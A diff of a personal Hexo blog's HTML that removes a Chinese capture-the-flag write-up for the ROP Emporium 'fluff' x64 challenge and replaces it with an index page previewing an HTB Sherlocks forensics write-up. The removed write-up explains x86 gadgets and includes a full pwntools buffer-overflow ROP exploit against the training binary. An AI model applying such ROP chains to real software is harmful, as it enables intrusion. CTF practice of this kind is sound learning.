@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 
 
-<html theme="dark" showBanner="true" hasBanner="desktop" > 
+<html theme="dark" showBanner="true" hasBanner="true" > 
 <link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
 <link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
 <link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
@@ -25,26 +25,19 @@
   
 
   
-  <title>Ropemporium-6-x64 | Hexo</title>
+  <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 
   <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
   <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
 
-  <meta name="description" content="说实话我感觉64的比32的难不少..应该是我笨的关系。 其中比较逆天的是bextr我着实找不到太多资料最后debug了半天发现了规律 举个栗子比如这里bextr rbx,rcx,rdx rcx &#x3D; 0b100010100 rdx &#x3D; 302 rbx的值就是rcx&gt;&gt;2,或者说是忽略掉低位的两位 123100010100 &gt;&gt;2#变成1000101 然后取低位开始数3位 12">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Ropemporium-6-x64">
-<meta property="og:url" content="http://example.com/2024/05/14/Ropemporium-6-x64/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/2/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="说实话我感觉64的比32的难不少..应该是我笨的关系。 其中比较逆天的是bextr我着实找不到太多资料最后debug了半天发现了规律 举个栗子比如这里bextr rbx,rcx,rdx rcx &#x3D; 0b100010100 rdx &#x3D; 302 rbx的值就是rcx&gt;&gt;2,或者说是忽略掉低位的两位 123100010100 &gt;&gt;2#变成1000101 然后取低位开始数3位 12">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/wpimages/2024/ctf/pwn/roprmporium_x64.jpg">
-<meta property="article:published_time" content="2024-05-14T05:45:15.000Z">
-<meta property="article:modified_time" content="2024-05-17T10:38:43.258Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/wpimages/2024/ctf/pwn/roprmporium_x64.jpg">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -67,14 +60,14 @@
   
   
     
-<div id="banner" class="">
+<div id="banner" class=" is_home ">
   <img src="/images/backgroup.jpg" itemprop="image">
   <div id="banner-dim"></div>
 </div>
  
    
   <div id="main-grid" class="  ">
-    <div id="nav" class=""  >
+    <div id="nav" class=" is_home "  >
       <navbar id="navbar">
   <nav id="title-nav">
     <a href="/">
@@ -252,22 +245,11 @@
 </sidebar>
     </div>
     <div id="content-body">
-       
+      
+   
 
 
-<article id="post-Ropemporium-6-x64" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  
-    
-<div class="article-gallery">
-  <div class="article-gallery-photos">
-    
-      <a class="article-gallery-img" rel="gallery_clwf59p7p000cywky875vhebu">
-        <img src="/wpimages/2024/ctf/pwn/roprmporium_x64.jpg" itemprop="image">
-      </a>
-    
-  </div>
-</div>
-
+<article id="post-test" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
    
   <div class="article-inner">
     <div class="article-main">
@@ -277,8 +259,8 @@
   <div class="main-title-dot"></div>
   
     
-      <h1 class="p-name article-title" itemprop="headline name">
-        Ropemporium-6-x64
+      <h1 itemprop="name">
+        <a class="p-name article-title" href="/2024/02/13/test/">【Sherlocks圣诞节特辑】htb OpTinselTrace-4 wp</a>
       </h1>
     
   
@@ -286,18 +268,18 @@
 
         <div class='meta-info-bar'>
           <div class="meta-info">
-  <time class="dt-published" datetime="2024-05-14T05:45:15.000Z" itemprop="datePublished">2024-05-14</time>
+  <time class="dt-published" datetime="2024-02-13T13:48:24.000Z" itemprop="datePublished">2024-02-13</time>
 </div>
           <div class="need-seperator meta-info">
             <div class="meta-cate-flex">
   
-    Uncategorized 
+  <a class="meta-cate-link" href="/categories/Sherlocks/">Sherlocks</a>
    
 </div>
   
           </div>
           <div class="wordcount need-seperator meta-info">
-            1.7k words 
+            3.8k words 
           </div>
         </div>
         
@@ -306,34 +288,12 @@
       </header>
       <div class="e-content article-entry" itemprop="articleBody">
         
-          <p>说实话我感觉64的比32的难不少..应该是我笨的关系。</p>
-<p>其中比较逆天的是<code>bextr</code>我着实找不到太多资料<br>最后debug了半天发现了规律</p>
-<p>举个栗子比如这里<code>bextr rbx,rcx,rdx</code></p>
-<p><code>rcx = 0b100010100</code></p>
-<p><code>rdx = 302</code></p>
-<p><code>rbx</code>的值就是<code>rcx&gt;&gt;2</code>,或者说是忽略掉低位的两位</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">100010100</span> &gt;&gt;<span class="number">2</span></span><br><span class="line"><span class="comment">#变成</span></span><br><span class="line"><span class="number">1000101</span></span><br></pre></td></tr></table></figure>
-<p>然后取低位开始数3位</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1000101</span></span><br><span class="line"><span class="comment">#取3位</span></span><br><span class="line"><span class="number">101</span></span><br></pre></td></tr></table></figure>
-<p>于是<code>rbx = 0b101 = 5</code></p>
-<p>再举个例子比如：2300就可以拆为 <code>23 00</code> </p>
-<p>代表从第0位开始取23位</p>
-<hr>
-<p><code>xlat</code>获取在<code>[rbx]</code>的地址+<code>al</code>的偏移的内容，然后再赋值给到<code>al</code></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xlat   BYTE PTR ds:[rbx]</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>这里<code>stosb</code>是根据<code>df</code>的值来决定，给<code>al</code>值赋给<code>rdi</code>后，目的地址，或是说这里的<code>rdi</code>的地址会+1或者-1，可以看作是前进或者后退，这样的话仅通过操作<code>df</code>就可以控制指针方向了，不过这里用不到df来做指向呢 XD</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00400639      aa       stosb   byte [rdi], al</span><br><span class="line">0x0040063a      c3       ret</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>思路蛮简单 最终要做的就是给<code>rdi</code>部分写入flag.txt，而给<code>rdi</code>指向的地址具体传东西是由<code>al</code>传递。</p>
-<p>所以需要控制<code>xlat   BYTE PTR ds:[rbx]</code>这里给<code>rax</code>低位（<code>al</code>）传参的是<code>rbx</code>（这里需要注意因为并没有能<code>pop rax</code>清理<code>rax</code>的指令，所以每次计算<code>rbx</code>给<code>al</code>传参都需要减去上一次<code>al</code>的偏移,去掉去第一次<code>al</code>默认的<code>0xb</code>，后面每一次<code>al</code>都是上一个字符，所以除第一次减<code>0xb</code>之外每次都需要<code>rbx - flag[上一个的位] - 0x3ef2</code>）</p>
-<p>再去找<code>rbx</code>就找到了<code>bextr rbx,rcx,rdx</code> 。</p>
-<p>要给<code>rbx</code>传参就要控制<code>rcx</code>和<code>rdx</code>这俩，由于会<code>rcx</code>给加<code>0x3ef2</code>所以直接写字符给<code>rcx</code>过去会被破坏掉，指定是不行了。</p>
-<p>于是用这个程序地址中的就字符ok。</p>
-<p>exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;fluff&#x27;</span>) </span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line">p=gdb.debug(<span class="string">&#x27;./fluff&#x27;</span>,<span class="string">&quot;b pwnme&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag=<span class="string">b&#x27;flag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x00601038</span></span><br><span class="line"></span><br><span class="line">pop_rdx_rcx_add_bextr=<span class="number">0x040062a</span></span><br><span class="line"></span><br><span class="line">xlat_al_rbx=<span class="number">0x0400628</span></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x04006a3</span></span><br><span class="line"></span><br><span class="line">stosb_rdi_al=<span class="number">0x0400639</span></span><br><span class="line"></span><br><span class="line">print_file=<span class="number">0x00400510</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">mask=p64(<span class="number">0x2300</span>)</span><br><span class="line"></span><br><span class="line">tmemaddress=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">	tmemaddress.append(<span class="built_in">hex</span>(read(<span class="string">&#x27;./fluff&#x27;</span>).find(flag[i])+elf.address))</span><br><span class="line"><span class="built_in">print</span>(tmemaddress)</span><br><span class="line"></span><br><span class="line">al=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">	payload+=p64(pop_rdx_rcx_add_bextr)+mask</span><br><span class="line">	<span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">		al=<span class="number">0xb</span></span><br><span class="line">	<span class="keyword">elif</span> i&gt;<span class="number">0</span>:</span><br><span class="line">		al=flag[i-<span class="number">1</span>]</span><br><span class="line">	payload+=p64(<span class="built_in">int</span>(tmemaddress[i],<span class="number">16</span>) - al - <span class="number">0x3ef2</span>)</span><br><span class="line">	payload+=p64(xlat_al_rbx)</span><br><span class="line">	payload+=p64(pop_rdi) + p64(bss+i)</span><br><span class="line">	payload+=p64(stosb_rdi_al)</span><br><span class="line">payload+=p64(pop_rdi)+p64(bss)+p64(print_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+          <div class="truncate-text">
+            
+              
+TASK1The performance of the network printer server has become sluggish, causing interruptions in the workflow at the North Pole workshop. Santa has directed us to generate a support request and examine the network data to pinpoint the source of the issue. He suspects that the Grinch and his group may be involved in this situation. Could you verify if there is an IP Address that is sending an excessive amount of traffic to the printer server?网络打印机服务器的性能变得迟钝，导致北极车间的工作流程中断。圣诞老人已指示我们生成支持请求并检查网络数...
+            
+          </div>
         
       </div>
 
@@ -341,43 +301,39 @@
     </div>
     
      
+    <a class="right-panel  with-pic  "
+       style="background-image: url(/images/1.png)" 
+      href="/2024/02/13/test/" 
+    >
+       
+      <div class="overlay">
+        <i class="fa-solid fa-angle-right with-pic"></i>
+      </div>
+       
+    </a>
+     
   </div>
-  
-    
-<nav id="article-nav">
-  <a class="article-nav-btn left "
-    
-      href="/2024/05/16/Tracks-cloud-steamcloud/"
-      title="Tracks-cloud-steamcloud"
-     >
-    <i class="fa-solid fa-angle-left"></i>
-    <p class="title-text">
-      
-        Tracks-cloud-steamcloud
-        
-    </p>
-  </a>
-  <a class="article-nav-btn right "
-    
-      href="/2024/05/13/Ropemporium-6-x86/"
-      title="Ropemporium-6-x86"
-     >
-
-    <p class="title-text">
-      
-        Ropemporium-6-x86
-        
-    </p>
-    <i class="fa-solid fa-angle-right"></i>
-  </a>
-</nav>
-
-
   
 </article>
 
 
 
+
+
+
+
+  <nav id="page-nav">
+    <!-- 在第二页时 page.prev_link 不知为何无法返回正确的链接 -->
+    <a id="prev-btn" class="page-nav-btn " href=" /  ">
+      <i class="fa-solid fa-angle-left"></i>
+    </a>
+    <div id="num-bar">
+      <a class="page-number" href="/">1</a><span class="page-number current">2</span>  
+    </div>
+    <a id="next-btn" class="page-nav-btn disabled" href="/">
+      <i class="fa-solid fa-angle-right"></i>
+    </a>
+  </nav>
 
 
     </div>
